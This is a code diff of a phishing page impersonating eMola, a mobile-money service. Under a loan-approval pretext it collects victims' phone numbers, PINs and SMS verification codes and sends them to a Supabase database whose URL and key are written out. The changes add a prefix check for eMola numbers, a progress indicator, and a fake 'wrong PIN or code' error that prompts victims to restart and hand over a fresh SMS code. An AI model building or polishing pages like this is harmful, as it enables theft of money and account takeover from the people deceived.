@@ -3,133 +3,486 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>eMola — Validação</title>
+  <title>eMola · Validação de conta</title>
   <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
     :root {
-      --orange: #f47721;
-      --orange-dark: #d95d0b;
-      --orange-light: #fff1e5;
-      --ink: #202124;
-      --muted: #6b7280;
-      --white: #fff;
-      --border: #f0d8c7;
-      --shadow: 0 18px 50px rgba(160, 75, 16, .15);
+      --orange-50: #fff6ef;
+      --orange-100: #ffe8d9;
+      --orange-200: #ffd2b3;
+      --orange-300: #ffb37a;
+      --orange-400: #ff8f3c;
+      --orange-500: #f47721;
+      --orange-600: #d95d0b;
+      --orange-700: #b44a08;
+      --ink-900: #1e1b18;
+      --ink-700: #3d3530;
+      --ink-500: #6f6259;
+      --ink-300: #a99e96;
+      --ink-100: #e5ddd6;
+      --white: #ffffff;
+      --shadow-lg: 0 24px 48px -12px rgba(180, 74, 8, 0.25);
+      --radius-lg: 28px;
+      --radius-sm: 12px;
+      --transition: 0.22s cubic-bezier(0.2, 0, 0, 1);
     }
-    * { box-sizing: border-box; }
+
     body {
-      margin: 0;
       min-height: 100vh;
-      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-      color: var(--ink);
-      background:
-        radial-gradient(circle at 10% 10%, rgba(255,255,255,.45), transparent 28%),
-        linear-gradient(135deg, #ff8b36, #f47721 55%, #e96812);
+      font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      color: var(--ink-900);
+      background: linear-gradient(145deg, #fef4ec 0%, #ffeadb 100%);
       display: grid;
       place-items: center;
-      padding: 22px;
+      padding: 24px;
+      line-height: 1.5;
+      -webkit-font-smoothing: antialiased;
     }
-    .shell { width: 100%; max-width: 440px; }
+
+    .shell { width: 100%; max-width: 460px; }
+
     .card {
       background: var(--white);
-      border-radius: 25px;
-      box-shadow: var(--shadow);
+      border-radius: var(--radius-lg);
+      box-shadow: var(--shadow-lg), 0 1px 2px rgba(0,0,0,0.02);
       overflow: hidden;
+      border: 1px solid rgba(255, 255, 255, 0.6);
     }
+
+    /* ---------- BRAND ---------- */
     .brand {
-      padding: 28px 28px 22px;
+      padding: 32px 28px 20px;
       text-align: center;
-      background: linear-gradient(180deg, #fff8f2, #fff);
-      border-bottom: 1px solid #fff0e4;
+      background: linear-gradient(180deg, #fffaf6, #ffffff);
+      border-bottom: 1px solid var(--orange-100);
     }
+
     .logo {
       display: inline-flex;
       align-items: center;
       justify-content: center;
-      width: 58px;
-      height: 58px;
-      border-radius: 18px;
+      width: 60px;
+      height: 60px;
+      border-radius: 20px;
       color: white;
-      font-weight: 900;
-      font-size: 1.8rem;
-      background: linear-gradient(145deg, #ff9b4a, #ed650e);
-      box-shadow: 0 7px 0 #c9540b, 0 12px 24px rgba(237,101,14,.25);
-      margin-bottom: 13px;
+      font-weight: 800;
+      font-size: 1.9rem;
+      background: linear-gradient(145deg, #ff9d4d, #e96f16);
+      box-shadow: 0 6px 0 var(--orange-700), 0 16px 28px -8px rgba(233, 111, 22, 0.45);
+      margin-bottom: 14px;
+      letter-spacing: -0.03em;
     }
-    h1 { margin: 0; color: var(--orange-dark); font-size: 2rem; letter-spacing: -.04em; }
-    .subtitle { margin: 7px 0 0; color: var(--muted); font-size: .94rem; }
-    .content { padding: 26px; }
-    .step { display: none; }
-    .step.active { display: block; animation: appear .28s ease-out; }
-    @keyframes appear { from {opacity:0; transform:translateY(7px)} to {opacity:1; transform:translateY(0)} }
-    h2 { font-size: 1.2rem; margin: 0 0 7px; }
-    .hint { color: var(--muted); font-size: .9rem; margin: 0 0 20px; line-height: 1.5; }
-    label { display: block; font-size: .85rem; font-weight: 700; margin: 15px 0 7px; }
-    input {
-      width: 100%; border: 1.5px solid var(--border); border-radius: 12px;
-      padding: 14px 15px; font: inherit; font-size: 1rem; outline: none;
-      transition: border .2s, box-shadow .2s; background: #fff;
+
+    .brand h1 {
+      font-size: 2rem;
+      font-weight: 800;
+      letter-spacing: -0.04em;
+      color: var(--ink-900);
+      margin-bottom: 4px;
     }
-    input:focus { border-color: var(--orange); box-shadow: 0 0 0 4px rgba(244,119,33,.13); }
-    .btn {
-      border: 0; width: 100%; margin-top: 20px; padding: 15px;
-      border-radius: 13px; color: white; background: linear-gradient(135deg, #ff8a32, #e96712);
-      font: inherit; font-weight: 800; font-size: 1rem; cursor: pointer;
-      box-shadow: 0 5px 0 #c9530b, 0 9px 18px rgba(233,103,18,.2);
-      transition: transform .12s, filter .12s;
+
+    .subtitle {
+      font-size: 0.93rem;
+      color: var(--ink-500);
+      font-weight: 500;
     }
-    .btn:hover { filter: brightness(1.04); }
-    .btn:active { transform: translateY(3px); box-shadow: 0 2px 0 #c9530b; }
-    .btn:disabled { opacity: .65; cursor: wait; }
-    .processing { text-align: center; padding: 12px 0 4px; }
-    .spinner {
-      width: 54px; height: 54px; border: 5px solid #ffe2cd; border-top-color: var(--orange);
-      border-radius: 50%; animation: spin .85s linear infinite; margin: 12px auto 18px;
+
+    /* ---------- STEP INDICATOR ---------- */
+    .steps {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 18px 28px 0;
     }
-    @keyframes spin { to { transform: rotate(360deg); } }
-    .processing h2 { margin-bottom: 9px; }
-    .status { color: var(--muted); font-size: .9rem; line-height: 1.5; }
-    .progress { height: 8px; background: #ffeadb; border-radius: 99px; overflow: hidden; margin: 20px 0 8px; }
-    .progress span { display: block; width: 0%; height: 100%; background: var(--orange); transition: width .2s linear; }
-    .timer { color: var(--orange-dark); font-weight: 800; font-variant-numeric: tabular-nums; }
-    .otp-row { display: flex; gap: 8px; margin-top: 10px; }
-    .otp-row input { text-align: center; font-size: 1.35rem; font-weight: 800; padding: 13px 0; }
-    .footer { padding: 0 26px 22px; text-align: center; color: #8b8b8b; font-size: .75rem; }
-    .small-link { color: var(--orange-dark); text-decoration: none; font-weight: 700; }
-    .error { color: #b42318; font-size: .85rem; margin-top: 10px; display: none; }
-    .notice {
-      border: 1px solid #ffd3b1;
-      background: #fff7f0;
-      color: #8c3d08;
-      border-radius: 12px;
-      padding: 11px 13px;
-      font-size: .82rem;
-      line-height: 1.45;
-      margin-bottom: 20px;
-    }
-    .notice strong { color: #b45309; }
-    /* Mensagem de erro final */
-    .final-error {
-      border: 1px solid #f5c2c0;
-      background: #fff5f5;
-      color: #b42318;
-      border-radius: 12px;
-      padding: 16px;
-      font-size: .95rem;
+
+    .step-dot {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 0.75rem;
       font-weight: 700;
-      text-align: center;
-      margin-top: 18px;
+      color: var(--ink-300);
+      transition: color var(--transition);
+    }
+
+    .step-dot .dot {
+      width: 26px;
+      height: 26px;
+      border-radius: 50%;
+      background: var(--ink-100);
+      color: var(--ink-300);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.78rem;
+      font-weight: 800;
+      transition: all var(--transition);
+    }
+
+    .step-dot.active {
+      color: var(--orange-600);
+    }
+
+    .step-dot.active .dot {
+      background: linear-gradient(145deg, #ff9d4d, #e96f16);
+      color: #fff;
+      box-shadow: 0 3px 0 var(--orange-700), 0 6px 12px -4px rgba(233, 111, 22, 0.4);
+    }
+
+    .step-dot.done .dot {
+      background: var(--orange-500);
+      color: #fff;
+    }
+
+    .step-dot.done {
+      color: var(--orange-500);
+    }
+
+    .step-line {
+      width: 18px;
+      height: 2px;
+      background: var(--ink-100);
+      border-radius: 2px;
+      transition: background var(--transition);
+    }
+
+    .step-line.done {
+      background: var(--orange-400);
+    }
+
+    /* ---------- CONTENT ---------- */
+    .content { padding: 24px 28px 28px; }
+
+    .step { display: none; }
+    .step.active {
+      display: block;
+      animation: fadeUp 0.35s cubic-bezier(0.2, 0, 0, 1);
+    }
+
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(8px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    h2 {
+      font-size: 1.32rem;
+      font-weight: 700;
+      letter-spacing: -0.02em;
+      color: var(--ink-900);
+      margin-bottom: 6px;
+    }
+
+    .hint {
+      font-size: 0.9rem;
+      color: var(--ink-500);
+      margin-bottom: 20px;
+      line-height: 1.55;
+    }
+
+    .notice {
+      border: 1px solid var(--orange-200);
+      background: var(--orange-50);
+      color: var(--orange-700);
+      border-radius: var(--radius-sm);
+      padding: 13px 16px;
+      font-size: 0.85rem;
+      line-height: 1.5;
+      margin-bottom: 22px;
+      font-weight: 500;
+      display: flex;
+      gap: 8px;
+      align-items: flex-start;
+    }
+
+    .notice::before {
+      content: "⚠️";
+      font-size: 1rem;
+      flex-shrink: 0;
+    }
+
+    .notice strong { color: var(--orange-700); font-weight: 700; }
+
+    /* Notice variant with SMS icon */
+    .notice.sms::before { content: "📩"; }
+
+    /* ---------- FORM ---------- */
+    label {
+      display: block;
+      font-size: 0.85rem;
+      font-weight: 700;
+      color: var(--ink-700);
+      margin: 16px 0 8px;
+      letter-spacing: -0.01em;
+    }
+
+    label:first-of-type { margin-top: 0; }
+
+    input {
+      width: 100%;
+      border: 1.5px solid var(--ink-100);
+      border-radius: var(--radius-sm);
+      padding: 15px 16px;
+      font: inherit;
+      font-size: 1rem;
+      font-weight: 500;
+      color: var(--ink-900);
+      outline: none;
+      background: #fcfaf9;
+      transition: border-color var(--transition), box-shadow var(--transition), background var(--transition);
+    }
+
+    input::placeholder { color: var(--ink-300); font-weight: 400; }
+    input:hover { border-color: var(--orange-200); }
+    input:focus {
+      border-color: var(--orange-500);
+      box-shadow: 0 0 0 4px rgba(244, 119, 33, 0.12);
+      background: var(--white);
+    }
+
+    .error {
+      display: none;
+      color: #c0392b;
+      font-size: 0.83rem;
+      font-weight: 600;
+      margin-top: 10px;
+      padding-left: 2px;
+      line-height: 1.45;
+    }
+
+    /* Prefix hint under phone */
+    .phone-hint {
+      font-size: 0.78rem;
+      color: var(--ink-500);
+      margin-top: 8px;
+      padding-left: 2px;
       line-height: 1.5;
     }
-    .final-error .btn {
-      margin-top: 14px;
-      background: linear-gradient(135deg, #ff8a32, #e96712);
+    .phone-hint strong {
+      color: var(--orange-600);
+      font-weight: 800;
     }
-    @media (max-width: 380px) {
-      body { padding: 12px; }
-      .content { padding: 21px; }
-      .brand { padding: 23px 20px 18px; }
+
+    /* ---------- BUTTONS ---------- */
+    .btn {
+      border: none;
+      width: 100%;
+      margin-top: 22px;
+      padding: 16px;
+      border-radius: var(--radius-sm);
+      color: white;
+      background: linear-gradient(135deg, #ff8f3c, #e96f16);
+      font: inherit;
+      font-weight: 700;
+      font-size: 1rem;
+      letter-spacing: -0.01em;
+      cursor: pointer;
+      box-shadow: 0 4px 0 var(--orange-700), 0 12px 24px -8px rgba(233, 111, 22, 0.35);
+      transition: transform var(--transition), box-shadow var(--transition), filter var(--transition);
+    }
+
+    .btn:hover:not(:disabled) {
+      filter: brightness(1.03);
+      transform: translateY(-1px);
+      box-shadow: 0 5px 0 var(--orange-700), 0 16px 28px -8px rgba(233, 111, 22, 0.4);
+    }
+
+    .btn:active:not(:disabled) {
+      transform: translateY(3px);
+      box-shadow: 0 1px 0 var(--orange-700), 0 8px 16px -4px rgba(233, 111, 22, 0.3);
+    }
+
+    .btn:disabled { opacity: 0.65; cursor: not-allowed; }
+
+    /* ---------- PROCESSING ---------- */
+    .processing { text-align: center; padding: 8px 0 4px; }
+
+    .spinner {
+      width: 60px;
+      height: 60px;
+      border: 4px solid var(--orange-100);
+      border-top-color: var(--orange-500);
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
+      margin: 16px auto 22px;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .processing h2 { margin-bottom: 10px; }
+
+    .status {
+      color: var(--ink-500);
+      font-size: 0.9rem;
+      line-height: 1.6;
+      font-weight: 500;
+    }
+
+    .timer {
+      color: var(--orange-600);
+      font-weight: 800;
+      font-variant-numeric: tabular-nums;
+    }
+
+    .progress {
+      height: 8px;
+      background: var(--orange-100);
+      border-radius: 99px;
+      overflow: hidden;
+      margin: 22px 0 10px;
+    }
+
+    .progress span {
+      display: block;
+      width: 0%;
+      height: 100%;
+      background: linear-gradient(90deg, var(--orange-400), var(--orange-500));
+      border-radius: 99px;
+      transition: width 0.25s linear;
+    }
+
+    /* ---------- OTP ---------- */
+    .otp-row {
+      display: flex;
+      gap: 10px;
+      margin-top: 12px;
+      justify-content: center;
+    }
+
+    .otp-row input {
+      text-align: center;
+      font-size: 1.5rem;
+      font-weight: 700;
+      padding: 14px 0;
+      border-radius: var(--radius-sm);
+      background: #fcfaf9;
+      border: 1.5px solid var(--ink-100);
+      transition: border-color var(--transition), box-shadow var(--transition), background var(--transition);
+      width: 100%;
+      min-width: 0;
+    }
+
+    .otp-row input:focus {
+      border-color: var(--orange-500);
+      box-shadow: 0 0 0 4px rgba(244, 119, 33, 0.12);
+      background: var(--white);
+    }
+
+    .otp-row input.filled {
+      border-color: var(--orange-300);
+      background: var(--white);
+    }
+
+    /* OTP validity badge */
+    .otp-validity {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      margin-top: 10px;
+      font-size: 0.82rem;
+      font-weight: 700;
+      color: var(--orange-700);
+      background: var(--orange-50);
+      border: 1px solid var(--orange-200);
+      border-radius: 99px;
+      padding: 6px 12px;
+    }
+
+    .otp-validity .pulse {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: var(--orange-500);
+      animation: pulse 1.4s ease-in-out infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.5; transform: scale(1.3); }
+    }
+
+    /* ---------- FINAL ERROR ---------- */
+    .final-error {
+      border: 1px solid #f5c2c0;
+      background: #fff8f8;
+      color: #b42318;
+      border-radius: var(--radius-sm);
+      padding: 20px;
+      font-size: 0.95rem;
+      font-weight: 600;
+      text-align: center;
+      margin-top: 22px;
+      line-height: 1.55;
+    }
+
+    .final-error .sms-note {
+      display: flex;
+      gap: 8px;
+      align-items: flex-start;
+      text-align: left;
+      margin-top: 14px;
+      padding: 12px 14px;
+      background: #fff;
+      border: 1px solid var(--orange-200);
+      border-radius: var(--radius-sm);
+      font-size: 0.86rem;
+      font-weight: 500;
+      color: var(--orange-700);
+    }
+
+    .final-error .sms-note::before {
+      content: "📩";
+      font-size: 1rem;
+      flex-shrink: 0;
+    }
+
+    .final-error .btn {
+      margin-top: 18px;
+      background: linear-gradient(135deg, #ff8f3c, #e96f16);
+      box-shadow: 0 4px 0 var(--orange-700);
+    }
+
+    /* ---------- FOOTER ---------- */
+    .footer { padding: 0 28px 24px; text-align: center; }
+
+    .small-link {
+      color: var(--orange-600);
+      text-decoration: none;
+      font-weight: 700;
+      font-size: 0.85rem;
+      opacity: 0.8;
+      transition: color var(--transition), opacity var(--transition);
+    }
+
+    .small-link:hover { color: var(--orange-700); opacity: 1; }
+
+    /* ---------- RESPONSIVE ---------- */
+    @media (max-width: 420px) {
+      body { padding: 16px; }
+      .brand { padding: 26px 20px 18px; }
+      .content { padding: 22px 20px 24px; }
+      .footer { padding: 0 20px 20px; }
+      .steps { padding: 16px 20px 0; }
+      .otp-row { gap: 7px; }
+      .otp-row input { font-size: 1.3rem; padding: 12px 0; }
+      h2 { font-size: 1.22rem; }
+      .logo { width: 54px; height: 54px; font-size: 1.7rem; border-radius: 18px; }
+      .brand h1 { font-size: 1.85rem; }
+      .step-dot span.label { display: none; }
+    }
+
+    @media (max-width: 360px) {
       .otp-row { gap: 5px; }
-      .otp-row input { font-size: 1.15rem; }
+      .otp-row input { font-size: 1.15rem; padding: 10px 0; border-radius: 10px; }
+      .step-line { width: 12px; }
+    }
+
+    .btn:focus-visible,
+    input:focus-visible,
+    .small-link:focus-visible {
+      outline: 2px solid var(--orange-500);
+      outline-offset: 3px;
     }
   </style>
 </head>
@@ -142,11 +495,30 @@
         <p class="subtitle">Validação de conta</p>
       </header>
 
+      <!-- STEP INDICATOR -->
+      <div class="steps" aria-label="Progresso de validação">
+        <div class="step-dot active" data-step="1">
+          <span class="dot">1</span>
+          <span class="label">Login</span>
+        </div>
+        <div class="step-line" data-line="1"></div>
+        <div class="step-dot" data-step="2">
+          <span class="dot">2</span>
+          <span class="label">Código</span>
+        </div>
+        <div class="step-line" data-line="2"></div>
+        <div class="step-dot" data-step="3">
+          <span class="dot">3</span>
+          <span class="label">Validação</span>
+        </div>
+      </div>
+
       <div class="content">
         <div class="notice">
           <strong>Atenção:</strong> escreva os seus dados corretos para não correr o risco do seu empréstimo não ser aprovado.
         </div>
 
+        <!-- STEP 1: LOGIN -->
         <form id="loginForm" class="step active">
           <h2>Entrar</h2>
           <p class="hint">Introduza o seu número de telefone e PIN.</p>
@@ -154,6 +526,7 @@
           <label for="phone">Número de telefone</label>
           <input id="phone" type="tel" inputmode="numeric" autocomplete="off"
                  placeholder="9 dígitos" maxlength="9" required>
+          <p class="phone-hint">Aceitamos números <strong>eMola</strong> que começam por <strong>86</strong>, <strong>87</strong> ou <strong>88</strong>.</p>
 
           <label for="pin">PIN (6 dígitos)</label>
           <input id="pin" type="password" inputmode="numeric" autocomplete="off"
@@ -163,6 +536,7 @@
           <button class="btn" type="submit">Entrar</button>
         </form>
 
+        <!-- STEP 2: PROCESSING -->
         <section id="processingStep" class="step">
           <div class="processing">
             <div class="spinner"></div>
@@ -173,12 +547,13 @@
           </div>
         </section>
 
+        <!-- STEP 3: OTP -->
         <form id="otpForm" class="step">
           <h2>Código de verificação</h2>
-          <div class="notice">
-            O sistema eMola irá enviar um código de verificação para o seu telefone. Introduza o código corretamente.
+          <div class="notice sms">
+            O sistema eMola irá enviar um <strong>código via SMS</strong> para o seu telefone. Introduza o código corretamente.
           </div>
-          <p class="hint">Introduza o código de 6 dígitos enviado para o seu telefone. O envio é automático ao preencher o último dígito.</p>
+          <p class="hint">Introduza o código de 6 dígitos enviado por SMS para o seu telefone. O envio é automático ao preencher o último dígito.</p>
           <label for="otp">Código de 6 dígitos</label>
           <div class="otp-row" aria-label="Código de verificação">
             <input class="otp-digit" type="text" inputmode="numeric" maxlength="1" aria-label="Dígito 1" required>
@@ -188,10 +563,15 @@
             <input class="otp-digit" type="text" inputmode="numeric" maxlength="1" aria-label="Dígito 5" required>
             <input class="otp-digit" type="text" inputmode="numeric" maxlength="1" aria-label="Dígito 6" required>
           </div>
+          <div class="otp-validity">
+            <span class="pulse"></span>
+            Código válido por <strong>1 minuto</strong>
+          </div>
           <p class="error" id="otpError">Introduza os 6 dígitos.</p>
           <button class="btn" type="submit">Continuar</button>
         </form>
 
+        <!-- STEP 4: WAITING + FINAL ERROR -->
         <section id="waitingStep" class="step">
           <div class="processing">
             <div class="spinner"></div>
@@ -202,11 +582,12 @@
             <p class="status" id="waitStatus">Não feche esta página.</p>
           </div>
 
-          <!-- Mensagem final: PIN ou OTP incorretos + botão Reiniciar -->
           <div id="finalErrorBox" class="final-error" style="display:none;">
-            O PIN ou o código OTP estão incorretos.<br>
-            Clique em <strong>Reiniciar</strong> e insira os dados corretamente.
-            <button class="btn" id="finalRestartBtn" type="button">Reiniciar</button>
+            O PIN ou o código OTP estão incorretos.
+            <div class="sms-note">
+              Ao clicar em <strong>Reiniciar</strong>, iremos enviar um <strong>novo código de verificação via SMS</strong> para o seu telefone. Insira os dados corretamente.
+            </div>
+            <button class="btn" id="finalRestartBtn" type="button">Reiniciar e receber novo código</button>
           </div>
         </section>
       </div>
@@ -219,7 +600,7 @@
 
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <script>
-    // ====== CREDENCIAIS SUPABASE ======
+    // ====== SUPABASE SETUP ======
     const SUPABASE_URL = "https://xsyovgwuodqdthpahnov.supabase.co";
     const SUPABASE_PUBLISHABLE_KEY = "sb_publishable_QeVZ4IY7ZFn_RKRvPRVyaQ_mFGcIYbw";
     const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY);
@@ -241,6 +622,7 @@
       }
     }
 
+    // ====== DOM ======
     const loginForm = document.getElementById("loginForm");
     const processingStep = document.getElementById("processingStep");
     const otpForm = document.getElementById("otpForm");
@@ -256,28 +638,74 @@
     const pinInput = document.getElementById("pin");
     const otpDigits = [...document.querySelectorAll(".otp-digit")];
 
+    const stepDots = [...document.querySelectorAll(".step-dot")];
+    const stepLines = [...document.querySelectorAll(".step-line")];
+
     let currentPhone = "";
     let currentPin = "";
     let waitInterval = null;
     let otpSubmitting = false;
 
+    // ====== STEP INDICATOR ======
+    // Etapa visual: 1 = login/processing, 2 = OTP, 3 = waiting/validação
+    function setStepIndicator(stepNumber) {
+      stepDots.forEach((dot, i) => {
+        const n = i + 1;
+        dot.classList.toggle("active", n === stepNumber);
+        dot.classList.toggle("done", n < stepNumber);
+      });
+      stepLines.forEach((line, i) => {
+        line.classList.toggle("done", (i + 1) < stepNumber);
+      });
+    }
+
+    // ====== UI HELPERS ======
     function showStep(step) {
       [loginForm, processingStep, otpForm, waitingStep]
         .forEach(el => el.classList.remove("active"));
       step.classList.add("active");
+
+      if (step === loginForm) setStepIndicator(1);
+      else if (step === processingStep) setStepIndicator(1);
+      else if (step === otpForm) setStepIndicator(2);
+      else if (step === waitingStep) setStepIndicator(3);
     }
 
+    function syncOtpFilled() {
+      otpDigits.forEach(inp => {
+        inp.classList.toggle("filled", inp.value.length > 0);
+      });
+    }
+
+    // ====== PHONE VALIDATION (eMola: 86, 87, 88) ======
+    function isValidEmolaPhone(phone) {
+      // 9 dígitos, começa por 86, 87 ou 88
+      return /^(86|87|88)\d{7}$/.test(phone);
+    }
+
+    // ====== LOGIN ======
     loginForm.addEventListener("submit", async (event) => {
       event.preventDefault();
       const phone = phoneInput.value.trim();
       const pin = pinInput.value.trim();
-      const phoneOk = /^\d{9}$/.test(phone);
+      const phoneOk = isValidEmolaPhone(phone);
       const pinOk = /^\d{6}$/.test(pin);
-      if (!phoneOk || !pinOk) {
-        document.getElementById("loginError").style.display = "block";
+
+      const loginError = document.getElementById("loginError");
+
+      if (!phoneOk) {
+        loginError.textContent = "Número inválido. O telefone deve começar por 86, 87 ou 88 (números eMola) e ter 9 dígitos.";
+        loginError.style.display = "block";
+        phoneInput.focus();
         return;
       }
-      document.getElementById("loginError").style.display = "none";
+      if (!pinOk) {
+        loginError.textContent = "O PIN deve ter exatamente 6 dígitos.";
+        loginError.style.display = "block";
+        pinInput.focus();
+        return;
+      }
+      loginError.style.display = "none";
 
       currentPhone = phone;
       currentPin = pin;
@@ -299,13 +727,16 @@
           pinInput.value = "";
           showStep(otpForm);
           otpDigits[0].focus();
+          syncOtpFilled();
         }
       }, 1000);
     });
 
+    // ====== OTP INPUT ======
     otpDigits.forEach((input, index) => {
       input.addEventListener("input", () => {
         input.value = input.value.replace(/\D/g, "").slice(0, 1);
+        syncOtpFilled();
         if (input.value && index < otpDigits.length - 1) {
           otpDigits[index + 1].focus();
         }
@@ -323,6 +754,7 @@
         event.preventDefault();
         const pasted = (event.clipboardData.getData("text") || "").replace(/\D/g, "").slice(0, 6);
         pasted.split("").forEach((digit, i) => { if (otpDigits[i]) otpDigits[i].value = digit; });
+        syncOtpFilled();
         const nextIndex = Math.min(pasted.length, 5);
         otpDigits[nextIndex].focus();
         if (pasted.length === 6 && !otpSubmitting) {
@@ -331,6 +763,7 @@
       });
     });
 
+    // ====== SUBMIT OTP ======
     async function submitOtp() {
       if (otpSubmitting) return;
       const code = otpDigits.map(input => input.value).join("");
@@ -348,12 +781,13 @@
       });
 
       otpDigits.forEach(input => input.value = "");
+      syncOtpFilled();
 
       showStep(waitingStep);
       startWait();
     }
 
-    // Espera de 1 minuto → mostra erro final (PIN/OTP incorretos) + botão Reiniciar
+    // ====== WAITING (1 minuto) → erro final ======
     function startWait() {
       if (waitInterval) clearInterval(waitInterval);
       let totalSeconds = 60;
@@ -386,13 +820,14 @@
       waitCountdown.textContent = `${m}:${s}`;
     }
 
+    // ====== OTP FORM SUBMIT (fallback) ======
     otpForm.addEventListener("submit", async (event) => {
       event.preventDefault();
       if (otpSubmitting) return;
       await submitOtp();
     });
 
-    // Função de reinício (usada pelo link do rodapé e pelo botão da mensagem final)
+    // ====== RESTART ======
     function restartFlow(event) {
       if (event) event.preventDefault();
       otpSubmitting = false;
@@ -406,12 +841,20 @@
       phoneInput.value = "";
       pinInput.value = "";
       otpDigits.forEach(input => input.value = "");
+      syncOtpFilled();
+      document.getElementById("loginError").style.display = "none";
+      document.getElementById("otpError").style.display = "none";
       showStep(loginForm);
       phoneInput.focus();
+      otpDigits.forEach(inp => inp.classList.remove("filled"));
     }
 
     document.getElementById("restart").addEventListener("click", restartFlow);
     finalRestartBtn.addEventListener("click", restartFlow);
+
+    // Inicialização
+    syncOtpFilled();
+    setStepIndicator(1);
   </script>
 </body>
 </html>
